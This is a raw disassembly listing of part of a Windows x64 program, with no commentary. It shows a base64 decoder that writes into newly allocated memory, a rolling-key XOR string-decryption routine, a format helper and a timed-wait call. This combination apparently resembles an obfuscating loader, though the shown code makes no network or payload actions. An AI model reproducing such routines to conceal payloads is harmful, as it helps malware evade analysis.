   140002d6b:	e9 aa f9 ff ff       	jmp    0x14000271a
   140002d70:	c6 05 97 b1 50 00 01 	movb   $0x1,0x50b197(%rip)        # 0x14050df0e
   140002d77:	66 c7 05 8c b1 50 00 	movw   $0xc7,0x50b18c(%rip)        # 0x14050df0c
   140002d7e:	c7 00 
   140002d80:	48 8d 0d 59 00 00 00 	lea    0x59(%rip),%rcx        # 0x140002de0
   140002d87:	e8 e4 e5 ff ff       	call   0x140001370
   140002d8c:	c6 05 9e af 50 00 01 	movb   $0x1,0x50af9e(%rip)        # 0x14050dd31
   140002d93:	e9 16 fc ff ff       	jmp    0x1400029ae
   140002d98:	cc                   	int3
   140002d99:	cc                   	int3
   140002d9a:	cc                   	int3
   140002d9b:	cc                   	int3
   140002d9c:	cc                   	int3
   140002d9d:	cc                   	int3
   140002d9e:	cc                   	int3
   140002d9f:	cc                   	int3
   140002da0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002da3:	0f 11 05 40 b1 50 00 	movups %xmm0,0x50b140(%rip)        # 0x14050deea
   140002daa:	0f 29 05 2f b1 50 00 	movaps %xmm0,0x50b12f(%rip)        # 0x14050dee0
   140002db1:	c3                   	ret
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	cc                   	int3
   140002db5:	cc                   	int3
   140002db6:	cc                   	int3
   140002db7:	cc                   	int3
   140002db8:	cc                   	int3
   140002db9:	cc                   	int3
   140002dba:	cc                   	int3
   140002dbb:	cc                   	int3
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	66 c7 05 3f b1 50 00 	movw   $0x0,0x50b13f(%rip)        # 0x14050df08
   140002dc7:	00 00 
   140002dc9:	48 c7 05 2c b1 50 00 	movq   $0x0,0x50b12c(%rip)        # 0x14050df00
   140002dd0:	00 00 00 00 
   140002dd4:	c3                   	ret
   140002dd5:	cc                   	int3
   140002dd6:	cc                   	int3
   140002dd7:	cc                   	int3
   140002dd8:	cc                   	int3
   140002dd9:	cc                   	int3
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	66 c7 05 23 b1 50 00 	movw   $0x0,0x50b123(%rip)        # 0x14050df0c
   140002de7:	00 00 
   140002de9:	c3                   	ret
   140002dea:	cc                   	int3
   140002deb:	cc                   	int3
   140002dec:	cc                   	int3
   140002ded:	cc                   	int3
   140002dee:	cc                   	int3
   140002def:	cc                   	int3
   140002df0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002df3:	0f 29 05 b6 d9 50 00 	movaps %xmm0,0x50d9b6(%rip)        # 0x1405107b0
   140002dfa:	0f 29 05 9f d9 50 00 	movaps %xmm0,0x50d99f(%rip)        # 0x1405107a0
   140002e01:	0f 29 05 88 d9 50 00 	movaps %xmm0,0x50d988(%rip)        # 0x140510790
   140002e08:	0f 29 05 71 d9 50 00 	movaps %xmm0,0x50d971(%rip)        # 0x140510780
   140002e0f:	0f 29 05 5a d9 50 00 	movaps %xmm0,0x50d95a(%rip)        # 0x140510770
   140002e16:	0f 29 05 43 d9 50 00 	movaps %xmm0,0x50d943(%rip)        # 0x140510760
   140002e1d:	0f 29 05 2c d9 50 00 	movaps %xmm0,0x50d92c(%rip)        # 0x140510750
   140002e24:	0f 29 05 15 d9 50 00 	movaps %xmm0,0x50d915(%rip)        # 0x140510740
   140002e2b:	0f 29 05 fe d8 50 00 	movaps %xmm0,0x50d8fe(%rip)        # 0x140510730
   140002e32:	0f 29 05 e7 d8 50 00 	movaps %xmm0,0x50d8e7(%rip)        # 0x140510720
   140002e39:	0f 29 05 d0 d8 50 00 	movaps %xmm0,0x50d8d0(%rip)        # 0x140510710
   140002e40:	0f 29 05 b9 d8 50 00 	movaps %xmm0,0x50d8b9(%rip)        # 0x140510700
   140002e47:	66 c7 05 70 d9 50 00 	movw   $0x0,0x50d970(%rip)        # 0x1405107c0
   140002e4e:	00 00 
   140002e50:	c3                   	ret
   140002e51:	cc                   	int3
   140002e52:	cc                   	int3
   140002e53:	cc                   	int3
   140002e54:	cc                   	int3
   140002e55:	cc                   	int3
   140002e56:	cc                   	int3
   140002e57:	cc                   	int3
   140002e58:	cc                   	int3
   140002e59:	cc                   	int3
   140002e5a:	cc                   	int3
   140002e5b:	cc                   	int3
   140002e5c:	cc                   	int3
   140002e5d:	cc                   	int3
   140002e5e:	cc                   	int3
   140002e5f:	cc                   	int3
   140002e60:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002e63:	0f 11 05 70 d9 50 00 	movups %xmm0,0x50d970(%rip)        # 0x1405107da
   140002e6a:	0f 29 05 5f d9 50 00 	movaps %xmm0,0x50d95f(%rip)        # 0x1405107d0
   140002e71:	c3                   	ret
   140002e72:	cc                   	int3
   140002e73:	cc                   	int3
   140002e74:	cc                   	int3
   140002e75:	cc                   	int3
   140002e76:	cc                   	int3
   140002e77:	cc                   	int3
   140002e78:	cc                   	int3
   140002e79:	cc                   	int3
   140002e7a:	cc                   	int3
   140002e7b:	cc                   	int3
   140002e7c:	cc                   	int3
   140002e7d:	cc                   	int3
   140002e7e:	cc                   	int3
   140002e7f:	cc                   	int3
   140002e80:	48 c7 05 6b d9 50 00 	movq   $0x0,0x50d96b(%rip)        # 0x1405107f6
   140002e87:	00 00 00 00 
   140002e8b:	48 c7 05 5a d9 50 00 	movq   $0x0,0x50d95a(%rip)        # 0x1405107f0
   140002e92:	00 00 00 00 
   140002e96:	c3                   	ret
   140002e97:	cc                   	int3
   140002e98:	cc                   	int3
   140002e99:	cc                   	int3
   140002e9a:	cc                   	int3
   140002e9b:	cc                   	int3
   140002e9c:	cc                   	int3
   140002e9d:	cc                   	int3
   140002e9e:	cc                   	int3
   140002e9f:	cc                   	int3
   140002ea0:	48 c7 05 55 d9 50 00 	movq   $0x0,0x50d955(%rip)        # 0x140510800
   140002ea7:	00 00 00 00 
   140002eab:	c3                   	ret
   140002eac:	cc                   	int3
   140002ead:	cc                   	int3
   140002eae:	cc                   	int3
   140002eaf:	cc                   	int3
   140002eb0:	48 c7 05 55 d9 50 00 	movq   $0x0,0x50d955(%rip)        # 0x140510810
   140002eb7:	00 00 00 00 
   140002ebb:	c3                   	ret
   140002ebc:	cc                   	int3
   140002ebd:	cc                   	int3
   140002ebe:	cc                   	int3
   140002ebf:	cc                   	int3
   140002ec0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002ec3:	0f 11 05 74 d9 50 00 	movups %xmm0,0x50d974(%rip)        # 0x14051083e
   140002eca:	0f 29 05 5f d9 50 00 	movaps %xmm0,0x50d95f(%rip)        # 0x140510830
   140002ed1:	0f 29 05 48 d9 50 00 	movaps %xmm0,0x50d948(%rip)        # 0x140510820
   140002ed8:	c3                   	ret
   140002ed9:	cc                   	int3
   140002eda:	cc                   	int3
   140002edb:	cc                   	int3
   140002edc:	cc                   	int3
   140002edd:	cc                   	int3
   140002ede:	cc                   	int3
   140002edf:	cc                   	int3
   140002ee0:	41 56                	push   %r14
   140002ee2:	56                   	push   %rsi
   140002ee3:	57                   	push   %rdi
   140002ee4:	55                   	push   %rbp
   140002ee5:	53                   	push   %rbx
   140002ee6:	b8 60 00 01 00       	mov    $0x10060,%eax
   140002eeb:	e8 70 f7 ff ff       	call   0x140002660
   140002ef0:	48 29 c4             	sub    %rax,%rsp
   140002ef3:	4d 89 ce             	mov    %r9,%r14
   140002ef6:	4c 89 c7             	mov    %r8,%rdi
   140002ef9:	48 89 d6             	mov    %rdx,%rsi
   140002efc:	89 cb                	mov    %ecx,%ebx
   140002efe:	31 ed                	xor    %ebp,%ebp
   140002f00:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002f05:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   140002f0b:	31 d2                	xor    %edx,%edx
   140002f0d:	e8 7e 01 01 00       	call   0x140013090
   140002f12:	48 8d 84 24 b0 00 01 	lea    0x100b0(%rsp),%rax
   140002f19:	00 
   140002f1a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002f1f:	41 0f b7 0e          	movzwl (%r14),%ecx
   140002f23:	66 85 c9             	test   %cx,%cx
   140002f26:	0f 84 bf 00 00 00    	je     0x140002feb
   140002f2c:	31 ed                	xor    %ebp,%ebp
   140002f2e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002f33:	eb 2e                	jmp    0x140002f63
   140002f35:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002f3c:	00 00 00 00 
   140002f40:	ff c5                	inc    %ebp
   140002f42:	66 89 4c 54 60       	mov    %cx,0x60(%rsp,%rdx,2)
   140002f47:	31 d2                	xor    %edx,%edx
   140002f49:	66 41 83 3e 00       	cmpw   $0x0,(%r14)
   140002f4e:	0f 95 c2             	setne  %dl
   140002f51:	41 0f b7 0c 56       	movzwl (%r14,%rdx,2),%ecx
   140002f56:	4d 8d 34 56          	lea    (%r14,%rdx,2),%r14
   140002f5a:	66 85 c9             	test   %cx,%cx
   140002f5d:	0f 84 88 00 00 00    	je     0x140002feb
   140002f63:	81 fd fd 7f 00 00    	cmp    $0x7ffd,%ebp
   140002f69:	0f 87 7c 00 00 00    	ja     0x140002feb
   140002f6f:	48 63 d5             	movslq %ebp,%rdx
   140002f72:	66 83 f9 25          	cmp    $0x25,%cx
   140002f76:	75 c8                	jne    0x140002f40
   140002f78:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140002f7c:	66 41 83 7e 02 53    	cmpw   $0x53,0x2(%r14)
   140002f82:	75 51                	jne    0x140002fd5
   140002f84:	4c 8d 40 08          	lea    0x8(%rax),%r8
   140002f88:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140002f8d:	48 8b 00             	mov    (%rax),%rax
   140002f90:	44 0f b7 10          	movzwl (%rax),%r10d
   140002f94:	66 45 85 d2          	test   %r10w,%r10w
   140002f98:	74 38                	je     0x140002fd2
   140002f9a:	48 81 fa ff 7f 00 00 	cmp    $0x7fff,%rdx
   140002fa1:	41 b9 fe 7f 00 00    	mov    $0x7ffe,%r9d
   140002fa7:	4c 0f 43 ca          	cmovae %rdx,%r9
   140002fab:	48 83 c0 02          	add    $0x2,%rax
   140002faf:	90                   	nop
   140002fb0:	48 81 fa fd 7f 00 00 	cmp    $0x7ffd,%rdx
   140002fb7:	77 24                	ja     0x140002fdd
   140002fb9:	ff c5                	inc    %ebp
   140002fbb:	66 44 89 54 54 60    	mov    %r10w,0x60(%rsp,%rdx,2)
   140002fc1:	48 ff c2             	inc    %rdx
   140002fc4:	44 0f b7 10          	movzwl (%rax),%r10d
   140002fc8:	48 83 c0 02          	add    $0x2,%rax
   140002fcc:	66 45 85 d2          	test   %r10w,%r10w
   140002fd0:	75 de                	jne    0x140002fb0
   140002fd2:	4c 89 c0             	mov    %r8,%rax
   140002fd5:	49 89 ce             	mov    %rcx,%r14
   140002fd8:	e9 6a ff ff ff       	jmp    0x140002f47
   140002fdd:	4c 89 c0             	mov    %r8,%rax
   140002fe0:	44 89 cd             	mov    %r9d,%ebp
   140002fe3:	49 89 ce             	mov    %rcx,%r14
   140002fe6:	e9 5c ff ff ff       	jmp    0x140002f47
   140002feb:	48 63 c5             	movslq %ebp,%rax
   140002fee:	66 c7 44 44 60 00 00 	movw   $0x0,0x60(%rsp,%rax,2)
   140002ff5:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002ffc:	00 
   140002ffd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003004:	00 00 
   140003006:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000300b:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140003010:	48 89 fa             	mov    %rdi,%rdx
   140003013:	49 89 f1             	mov    %rsi,%r9
   140003016:	e8 75 f6 ff ff       	call   0x140002690
   14000301b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003020:	e8 39 e4 ff ff       	call   0x14000145e
   140003025:	84 db                	test   %bl,%bl
   140003027:	74 1a                	je     0x140003043
   140003029:	48 c7 44 24 40 00 5d 	movq   $0xffffffffee1e5d00,0x40(%rsp)
   140003030:	1e ee 
   140003032:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003037:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000303c:	31 d2                	xor    %edx,%edx
   14000303e:	e8 cf e4 ff ff       	call   0x140001512
   140003043:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003048:	e8 11 e4 ff ff       	call   0x14000145e
   14000304d:	90                   	nop
   14000304e:	48 81 c4 60 00 01 00 	add    $0x10060,%rsp
   140003055:	5b                   	pop    %rbx
   140003056:	5d                   	pop    %rbp
   140003057:	5f                   	pop    %rdi
   140003058:	5e                   	pop    %rsi
   140003059:	41 5e                	pop    %r14
   14000305b:	c3                   	ret
   14000305c:	cc                   	int3
   14000305d:	cc                   	int3
   14000305e:	cc                   	int3
   14000305f:	cc                   	int3
   140003060:	41 56                	push   %r14
   140003062:	56                   	push   %rsi
   140003063:	57                   	push   %rdi
   140003064:	55                   	push   %rbp
   140003065:	53                   	push   %rbx
   140003066:	48 83 ec 40          	sub    $0x40,%rsp
   14000306a:	4c 89 c6             	mov    %r8,%rsi
   14000306d:	48 89 d7             	mov    %rdx,%rdi
   140003070:	48 89 cb             	mov    %rcx,%rbx
   140003073:	e8 58 02 00 00       	call   0x1400032d0
   140003078:	48 89 f8             	mov    %rdi,%rax
   14000307b:	48 c1 e8 02          	shr    $0x2,%rax
   14000307f:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003083:	48 89 06             	mov    %rax,(%rsi)
   140003086:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000308b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003092:	00 00 
   140003094:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   14000309b:	00 
   14000309c:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   1400030a3:	00 
   1400030a4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400030a9:	45 31 f6             	xor    %r14d,%r14d
   1400030ac:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   1400030b1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400030b8:	45 31 c0             	xor    %r8d,%r8d
   1400030bb:	e8 e9 e3 ff ff       	call   0x1400014a9
   1400030c0:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   1400030c5:	41 b9 3e 00 00 00    	mov    $0x3e,%r9d
   1400030cb:	31 c9                	xor    %ecx,%ecx
   1400030cd:	eb 11                	jmp    0x1400030e0
   1400030cf:	90                   	nop
   1400030d0:	49 83 c6 04          	add    $0x4,%r14
   1400030d4:	48 89 d1             	mov    %rdx,%rcx
   1400030d7:	49 39 fe             	cmp    %rdi,%r14
   1400030da:	0f 83 d1 01 00 00    	jae    0x1400032b1
   1400030e0:	42 0f b6 04 33       	movzbl (%rbx,%r14,1),%eax
   1400030e5:	8d 50 a5             	lea    -0x5b(%rax),%edx
   1400030e8:	80 fa e6             	cmp    $0xe6,%dl
   1400030eb:	73 33                	jae    0x140003120
   1400030ed:	8d 50 85             	lea    -0x7b(%rax),%edx
   1400030f0:	80 fa e6             	cmp    $0xe6,%dl
   1400030f3:	73 3b                	jae    0x140003130
   1400030f5:	8d 50 c6             	lea    -0x3a(%rax),%edx
   1400030f8:	80 fa f6             	cmp    $0xf6,%dl
   1400030fb:	73 38                	jae    0x140003135
   1400030fd:	ba 3f 00 00 00       	mov    $0x3f,%edx
   140003102:	83 f8 2f             	cmp    $0x2f,%eax
   140003105:	74 02                	je     0x140003109
   140003107:	31 d2                	xor    %edx,%edx
   140003109:	83 f8 2b             	cmp    $0x2b,%eax
   14000310c:	41 0f 44 d1          	cmove  %r9d,%edx
   140003110:	eb 30                	jmp    0x140003142
   140003112:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003119:	1f 84 00 00 00 00 00 
   140003120:	83 c0 bf             	add    $0xffffffbf,%eax
   140003123:	eb 1b                	jmp    0x140003140
   140003125:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000312c:	00 00 00 00 
   140003130:	83 c0 b9             	add    $0xffffffb9,%eax
   140003133:	eb 0b                	jmp    0x140003140
   140003135:	83 c0 04             	add    $0x4,%eax
   140003138:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000313f:	00 
   140003140:	89 c2                	mov    %eax,%edx
   140003142:	42 0f b6 44 33 01    	movzbl 0x1(%rbx,%r14,1),%eax
   140003148:	44 8d 40 a5          	lea    -0x5b(%rax),%r8d
   14000314c:	41 80 f8 e6          	cmp    $0xe6,%r8b
   140003150:	73 2e                	jae    0x140003180
   140003152:	44 8d 40 85          	lea    -0x7b(%rax),%r8d
   140003156:	41 80 f8 e6          	cmp    $0xe6,%r8b
   14000315a:	73 34                	jae    0x140003190
   14000315c:	44 8d 40 c6          	lea    -0x3a(%rax),%r8d
   140003160:	41 80 f8 f6          	cmp    $0xf6,%r8b
   140003164:	73 2f                	jae    0x140003195
   140003166:	41 b8 3f 00 00 00    	mov    $0x3f,%r8d
   14000316c:	83 f8 2f             	cmp    $0x2f,%eax
   14000316f:	74 03                	je     0x140003174
   140003171:	45 31 c0             	xor    %r8d,%r8d
   140003174:	83 f8 2b             	cmp    $0x2b,%eax
   140003177:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000317b:	eb 26                	jmp    0x1400031a3
   14000317d:	0f 1f 00             	nopl   (%rax)
   140003180:	83 c0 bf             	add    $0xffffffbf,%eax
   140003183:	eb 1b                	jmp    0x1400031a0
   140003185:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000318c:	00 00 00 00 
   140003190:	83 c0 b9             	add    $0xffffffb9,%eax
   140003193:	eb 0b                	jmp    0x1400031a0
   140003195:	83 c0 04             	add    $0x4,%eax
   140003198:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000319f:	00 
   1400031a0:	41 89 c0             	mov    %eax,%r8d
   1400031a3:	46 0f b6 54 33 02    	movzbl 0x2(%rbx,%r14,1),%r10d
   1400031a9:	41 8d 42 a5          	lea    -0x5b(%r10),%eax
   1400031ad:	3c e6                	cmp    $0xe6,%al
   1400031af:	73 2f                	jae    0x1400031e0
   1400031b1:	41 8d 42 85          	lea    -0x7b(%r10),%eax
   1400031b5:	3c e6                	cmp    $0xe6,%al
   1400031b7:	73 37                	jae    0x1400031f0
   1400031b9:	41 8d 42 c6          	lea    -0x3a(%r10),%eax
   1400031bd:	3c f6                	cmp    $0xf6,%al
   1400031bf:	73 35                	jae    0x1400031f6
   1400031c1:	b8 3f 00 00 00       	mov    $0x3f,%eax
   1400031c6:	41 83 fa 2f          	cmp    $0x2f,%r10d
   1400031ca:	74 02                	je     0x1400031ce
   1400031cc:	31 c0                	xor    %eax,%eax
   1400031ce:	41 83 fa 2b          	cmp    $0x2b,%r10d
   1400031d2:	41 0f 44 c1          	cmove  %r9d,%eax
   1400031d6:	eb 2b                	jmp    0x140003203
   1400031d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400031df:	00 
   1400031e0:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   1400031e4:	eb 1a                	jmp    0x140003200
   1400031e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400031ed:	00 00 00 
   1400031f0:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   1400031f4:	eb 0a                	jmp    0x140003200
   1400031f6:	41 83 c2 04          	add    $0x4,%r10d
   1400031fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003200:	44 89 d0             	mov    %r10d,%eax
   140003203:	46 0f b6 54 33 03    	movzbl 0x3(%rbx,%r14,1),%r10d
   140003209:	45 8d 5a a5          	lea    -0x5b(%r10),%r11d
   14000320d:	41 80 fb e6          	cmp    $0xe6,%r11b
   140003211:	73 2d                	jae    0x140003240
   140003213:	45 8d 5a 85          	lea    -0x7b(%r10),%r11d
   140003217:	41 80 fb e6          	cmp    $0xe6,%r11b
   14000321b:	73 33                	jae    0x140003250
   14000321d:	45 8d 5a c6          	lea    -0x3a(%r10),%r11d
   140003221:	41 80 fb f6          	cmp    $0xf6,%r11b
   140003225:	73 2f                	jae    0x140003256
   140003227:	41 bb 3f 00 00 00    	mov    $0x3f,%r11d
   14000322d:	41 83 fa 2f          	cmp    $0x2f,%r10d
   140003231:	74 03                	je     0x140003236
   140003233:	45 31 db             	xor    %r11d,%r11d
   140003236:	41 83 fa 2b          	cmp    $0x2b,%r10d
   14000323a:	45 0f 44 d9          	cmove  %r9d,%r11d
   14000323e:	eb 23                	jmp    0x140003263
   140003240:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   140003244:	eb 1a                	jmp    0x140003260
   140003246:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000324d:	00 00 00 
   140003250:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003254:	eb 0a                	jmp    0x140003260
   140003256:	41 83 c2 04          	add    $0x4,%r10d
   14000325a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003260:	45 89 d3             	mov    %r10d,%r11d
   140003263:	c1 e2 12             	shl    $0x12,%edx
   140003266:	41 c1 e0 0c          	shl    $0xc,%r8d
   14000326a:	41 09 d0             	or     %edx,%r8d
   14000326d:	c1 e0 06             	shl    $0x6,%eax
   140003270:	44 09 d8             	or     %r11d,%eax
   140003273:	44 09 c0             	or     %r8d,%eax
   140003276:	41 89 c0             	mov    %eax,%r8d
   140003279:	41 c1 e8 10          	shr    $0x10,%r8d
   14000327d:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140003281:	44 88 44 0d 00       	mov    %r8b,0x0(%rbp,%rcx,1)
   140003286:	4c 8b 06             	mov    (%rsi),%r8
   140003289:	4c 39 c2             	cmp    %r8,%rdx
   14000328c:	73 0e                	jae    0x14000329c
   14000328e:	88 64 0d 01          	mov    %ah,0x1(%rbp,%rcx,1)
   140003292:	48 83 c1 02          	add    $0x2,%rcx
   140003296:	4c 8b 06             	mov    (%rsi),%r8
   140003299:	48 89 ca             	mov    %rcx,%rdx
   14000329c:	4c 39 c2             	cmp    %r8,%rdx
   14000329f:	0f 83 2b fe ff ff    	jae    0x1400030d0
   1400032a5:	88 44 15 00          	mov    %al,0x0(%rbp,%rdx,1)
   1400032a9:	48 ff c2             	inc    %rdx
   1400032ac:	e9 1f fe ff ff       	jmp    0x1400030d0
   1400032b1:	48 8b 16             	mov    (%rsi),%rdx
   1400032b4:	48 89 e9             	mov    %rbp,%rcx
   1400032b7:	e8 14 00 00 00       	call   0x1400032d0
   1400032bc:	48 89 e8             	mov    %rbp,%rax
   1400032bf:	48 83 c4 40          	add    $0x40,%rsp
   1400032c3:	5b                   	pop    %rbx
   1400032c4:	5d                   	pop    %rbp
   1400032c5:	5f                   	pop    %rdi
   1400032c6:	5e                   	pop    %rsi
   1400032c7:	41 5e                	pop    %r14
   1400032c9:	c3                   	ret
   1400032ca:	cc                   	int3
   1400032cb:	cc                   	int3
   1400032cc:	cc                   	int3
   1400032cd:	cc                   	int3
   1400032ce:	cc                   	int3
   1400032cf:	cc                   	int3
   1400032d0:	56                   	push   %rsi
   1400032d1:	57                   	push   %rdi
   1400032d2:	53                   	push   %rbx
   1400032d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400032d7:	48 85 d2             	test   %rdx,%rdx
   1400032da:	74 67                	je     0x140003343
   1400032dc:	48 89 d6             	mov    %rdx,%rsi
   1400032df:	48 89 cf             	mov    %rcx,%rdi
   1400032e2:	0f b6 19             	movzbl (%rcx),%ebx
   1400032e5:	80 3d be aa 50 00 00 	cmpb   $0x0,0x50aabe(%rip)        # 0x14050ddaa
   1400032ec:	0f 84 dc 00 00 00    	je     0x1400033ce
   1400032f2:	80 3d f8 d3 50 00 00 	cmpb   $0x0,0x50d3f8(%rip)        # 0x1405106f1
   1400032f9:	74 3a                	je     0x140003335
   1400032fb:	66 0f 6f 05 cd 12 01 	movdqa 0x112cd(%rip),%xmm0        # 0x1400145d0
   140003302:	00 
   140003303:	66 0f 6f 0d c5 d3 50 	movdqa 0x50d3c5(%rip),%xmm1        # 0x1405106d0
   14000330a:	00 
   14000330b:	66 0f fc c8          	paddb  %xmm0,%xmm1
   14000330f:	66 0f 7f 0d b9 d3 50 	movdqa %xmm1,0x50d3b9(%rip)        # 0x1405106d0
   140003316:	00 
   140003317:	66 0f fc 05 c1 d3 50 	paddb  0x50d3c1(%rip),%xmm0        # 0x1405106e0
   14000331e:	00 
   14000331f:	66 0f 7f 05 b9 d3 50 	movdqa %xmm0,0x50d3b9(%rip)        # 0x1405106e0
   140003326:	00 
   140003327:	80 05 c2 d3 50 00 e7 	addb   $0xe7,0x50d3c2(%rip)        # 0x1405106f0
   14000332e:	c6 05 bc d3 50 00 00 	movb   $0x0,0x50d3bc(%rip)        # 0x1405106f1
   140003335:	32 1d 95 d3 50 00    	xor    0x50d395(%rip),%bl        # 0x1405106d0
   14000333b:	88 1f                	mov    %bl,(%rdi)
   14000333d:	48 83 fe 01          	cmp    $0x1,%rsi
   140003341:	75 08                	jne    0x14000334b
   140003343:	48 83 c4 20          	add    $0x20,%rsp
   140003347:	5b                   	pop    %rbx
   140003348:	5f                   	pop    %rdi
   140003349:	5e                   	pop    %rsi
   14000334a:	c3                   	ret
   14000334b:	44 0f b6 05 9e d3 50 	movzbl 0x50d39e(%rip),%r8d        # 0x1405106f1
   140003352:	00 
   140003353:	66 0f 6f 05 75 d3 50 	movdqa 0x50d375(%rip),%xmm0        # 0x1405106d0
   14000335a:	00 
   14000335b:	66 0f 6f 0d 7d d3 50 	movdqa 0x50d37d(%rip),%xmm1        # 0x1405106e0
   140003362:	00 
   140003363:	b8 01 00 00 00       	mov    $0x1,%eax
   140003368:	0f b6 0d 81 d3 50 00 	movzbl 0x50d381(%rip),%ecx        # 0x1405106f0
   14000336f:	48 8d 15 5a d3 50 00 	lea    0x50d35a(%rip),%rdx        # 0x1405106d0
   140003376:	66 0f 6f 15 52 12 01 	movdqa 0x11252(%rip),%xmm2        # 0x1400145d0
   14000337d:	00 
   14000337e:	eb 17                	jmp    0x140003397
   140003380:	41 89 c2             	mov    %eax,%r10d
   140003383:	41 83 e2 1f          	and    $0x1f,%r10d
   140003387:	45 32 0c 12          	xor    (%r10,%rdx,1),%r9b
   14000338b:	44 88 0c 07          	mov    %r9b,(%rdi,%rax,1)
   14000338f:	48 ff c0             	inc    %rax
   140003392:	48 39 c6             	cmp    %rax,%rsi
   140003395:	74 ac                	je     0x140003343
   140003397:	44 0f b6 0c 07       	movzbl (%rdi,%rax,1),%r9d
   14000339c:	45 84 c0             	test   %r8b,%r8b
   14000339f:	74 df                	je     0x140003380
   1400033a1:	66 0f fc c2          	paddb  %xmm2,%xmm0
   1400033a5:	66 0f 7f 05 23 d3 50 	movdqa %xmm0,0x50d323(%rip)        # 0x1405106d0
   1400033ac:	00 
   1400033ad:	66 0f fc ca          	paddb  %xmm2,%xmm1
   1400033b1:	66 0f 7f 0d 27 d3 50 	movdqa %xmm1,0x50d327(%rip)        # 0x1405106e0
   1400033b8:	00 
   1400033b9:	80 c1 e7             	add    $0xe7,%cl
   1400033bc:	88 0d 2e d3 50 00    	mov    %cl,0x50d32e(%rip)        # 0x1405106f0
   1400033c2:	c6 05 28 d3 50 00 00 	movb   $0x0,0x50d328(%rip)        # 0x1405106f1
   1400033c9:	45 31 c0             	xor    %r8d,%r8d
   1400033cc:	eb b2                	jmp    0x140003380
   1400033ce:	0f 28 05 db 11 01 00 	movaps 0x111db(%rip),%xmm0        # 0x1400145b0
   1400033d5:	0f 29 05 f4 d2 50 00 	movaps %xmm0,0x50d2f4(%rip)        # 0x1405106d0
   1400033dc:	66 0f 6f 05 dc 11 01 	movdqa 0x111dc(%rip),%xmm0        # 0x1400145c0
   1400033e3:	00 
   1400033e4:	66 0f 7f 05 f4 d2 50 	movdqa %xmm0,0x50d2f4(%rip)        # 0x1405106e0
   1400033eb:	00 
   1400033ec:	66 c7 05 fb d2 50 00 	movw   $0x119,0x50d2fb(%rip)        # 0x1405106f0
   1400033f3:	19 01 
   1400033f5:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x140003420
   1400033fc:	e8 6f df ff ff       	call   0x140001370
   140003401:	c6 05 a2 a9 50 00 01 	movb   $0x1,0x50a9a2(%rip)        # 0x14050ddaa
   140003408:	80 3d e2 d2 50 00 00 	cmpb   $0x0,0x50d2e2(%rip)        # 0x1405106f1
   14000340f:	0f 85 e6 fe ff ff    	jne    0x1400032fb
   140003415:	e9 1b ff ff ff       	jmp    0x140003335
   14000341a:	cc                   	int3
   14000341b:	cc                   	int3
   14000341c:	cc                   	int3
   14000341d:	cc                   	int3
   14000341e:	cc                   	int3
   14000341f:	cc                   	int3
   140003420:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003423:	0f 29 05 b6 d2 50 00 	movaps %xmm0,0x50d2b6(%rip)        # 0x1405106e0
   14000342a:	0f 29 05 9f d2 50 00 	movaps %xmm0,0x50d29f(%rip)        # 0x1405106d0
   140003431:	c6 05 b8 d2 50 00 00 	movb   $0x0,0x50d2b8(%rip)        # 0x1405106f0
   140003438:	c3                   	ret
   140003439:	cc                   	int3
